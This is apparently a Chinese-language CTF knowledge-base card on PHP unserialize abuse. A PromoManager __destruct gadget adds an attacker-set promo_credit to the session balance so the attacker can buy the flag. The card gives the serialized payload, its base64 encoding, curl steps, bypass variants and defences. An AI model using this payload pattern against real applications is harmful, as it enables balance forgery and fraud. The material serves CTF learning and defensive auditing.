---
id: web-php-deserialization-destruct-session-balance-forge
title: PHP 反序列化 PromoManager __destruct 篡改 session 余额购买 flag
type: scenario
domain: web
path: web/php/deserialization
technique: php-unserialize-destruct-session-balance-forge
tags:
- php
- deserialization
- destruct
- session
- business-logic
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V111
  verified_at: '2026-11-06T01:46:35+08:00'
  notes: 已对照 WEBPHPPayment 原文核对：apply_coupon.php base64+unserialize、PromoManager::__destruct 加 ['balance']、价格 99999/初始 20、payload 与 Base64、远程 flag 均一致；PoC 未本机执行
url: /docs/web/php/deserialization/web-php-deserialization-destruct-session-balance-forge/
draft: false
kb_aliases:
- PromoManager
- __destruct 加钱
- session balance
- 优惠券反序列化
- WEBPHPPayment
---

## 一句话结论

当优惠券接口对用户提交的 `coupon` 做 base64 解码后直接 `unserialize()`，而 `PromoManager::__destruct()` 会把可控的 `promo_credit` 加到 `$_SESSION['balance']` 时，提交一个 `promo_credit=100000` 的序列化对象即可把余额提升到足以购买 flag，再复用同一 PHPSESSID 购买。

## 原理

- **反序列化入口**：`apply_coupon.php` 取 `$_POST['coupon']`，`base64_decode` 后 `@unserialize($decoded)`；用户可以完全控制反序列化后的对象结构与属性。
- **析构 gadget**：`PromoManager::__destruct()` 检查 `promo_credit` 存在且 `is_numeric`，执行 `$_SESSION['balance'] += intval($this->promo_credit)`；对象在请求结束/销毁时自动触发，无需其他方法调用。
- **业务逻辑**：`buy.php` 中 flag 价格 99999，初始余额 20；只要 session 余额足够即可购买。源码中的 `$flag` 是兜底诱饵，真实 flag 来自 `/var/www/flag.php`。
- **为什么成立**：反序列化 + 析构函数 + session 余额三个条件组合；攻击者不需要支付/优惠券校验，直接构造对象即可加钱。
- **边界**：若 `unserialize` 使用 `allowed_classes`/签名、或余额由服务端订单计算、或析构不信任属性，则失效；需要保持同一 session。

## 触发条件

- 存在用户可控的 `unserialize()` 入口（base64/JSON 解码后）。
- 可利用类的 `__destruct`/`__wakeup` 会修改 session/余额/权限等敏感状态。
- 业务逻辑信任 session 中的余额/角色，且购买接口只检查该值。
- 攻击者能保持同一 PHPSESSID（先访问首页获取 cookie）。

## 利用步骤

1. 访问 `/` 获取有效 `PHPSESSID` Cookie（应用会初始化 session）。
2. 构造序列化对象：
   ```text
   O:12:"PromoManager":2:{s:12:"promo_credit";i:100000;s:10:"promo_code";s:4:"test";}
   ```
   Base64 编码后作为 `coupon` 提交到 `/api/apply_coupon.php`。
3. 复用同一 Cookie，向 `/buy.php` 提交 `item=flag`；余额已 >=99999，购买成功。
4. 读取响应 flag；本题为 `flag{7040bfbb686c6ce7d509106369d62d1e}`。
5. 若 `promo_credit` 被过滤，尝试负数/浮点/数组/其他 gadget 类；若 session 未初始化，先访问 `/`。

## PoC

```text
O:12:"PromoManager":2:{s:12:"promo_credit";i:100000;s:10:"promo_code";s:4:"test";}
```

Base64：

```text
TzoxMjoiUHJvbW9NYW5hZ2VyIjoyOntzOjEyOiJwcm9tb19jcmVkaXQiO2k6MTAwMDAwO3M6MTA6InByb21vX2NvZGUiO3M6NDoidGVzdCI7fQ==
```

```bash
curl -i -c cookies.txt http://target:28065/
curl -b cookies.txt -c cookies.txt \
  --data-urlencode "coupon=TzoxMjoiUHJvbW9NYW5hZ2VyIjoyOntzOjEyOiJwcm9tb19jcmVkaXQiO2k6MTAwMDAwO3M6MTA6InByb21vX2NvZGUiO3M6NDoidGVzdCI7fQ==" \
  http://target:28065/api/apply_coupon.php
curl -i -b cookies.txt -c cookies.txt -d "item=flag" http://target:28065/buy.php
```

## 变体与关联

- **变体（析构/唤醒）**：`__destruct`/`__wakeup`/`__toString` 修改 session/余额/角色/文件；按类审计。
- **变体（入口）**：Cookie、POST、base64/JSON/序列化嵌套；`phar://` metadata 也可触发。
- **变体（业务）**：优惠券、积分、订单金额、VIP 到期时间；核心是“客户端对象属性 → 服务端敏感状态”。
- **关联卡片**：[[web-php-deserialization-magic-chain-eval-wakeup-bypass]]（魔术方法链）、[[web-php-deserialization-phar-gif8-stub-inner-php-suffix-bypass]]（PHAR 反序列化）、[[web-php-deserialization-reflection-private-property-payload]]（属性构造）。
- **边界**：`allowed_classes=false`、签名/HMAC、服务端余额校验会阻止；需要同一 session。

## 检测与防御

- **不要反序列化用户输入**：使用 JSON + 严格 schema；必须反序列化时用 `allowed_classes` 白名单，禁止 `PromoManager` 等业务类。
- **服务端权威**：余额/价格/优惠由服务端订单/数据库计算，不信任 session 中的客户端可控值。
- **审计**：搜索 `unserialize(` 与 `__destruct`/`__wakeup` 修改 `$_SESSION`/全局状态的组合。
- **检测**：监控 base64 序列化字符串（`O:`/`s:`）提交、异常优惠券请求、余额突变。
